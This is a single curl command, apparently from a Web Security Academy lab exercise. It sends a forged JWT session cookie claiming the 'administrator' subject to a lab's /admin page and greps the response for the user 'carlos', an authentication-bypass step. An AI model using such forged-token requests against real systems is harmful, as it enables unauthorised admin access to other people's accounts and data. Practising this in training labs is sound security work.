curl -s "https://<lab-url>.web-security-academy.net/admin" \
  -b "session=eyJraWQiOiI2NmE0ZGU3My00ZjNiLTRiYzMtYWY5ZS05MTM3MjZmZjc5ZTkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQyOTkzNywic3ViIjoiYWRtaW5pc3RyYXRvciJ9.E8mcBwAiA4NqHpbxGyq9lWwHXak7oZjKztwJcTagv7E" \
  | grep "carlos"
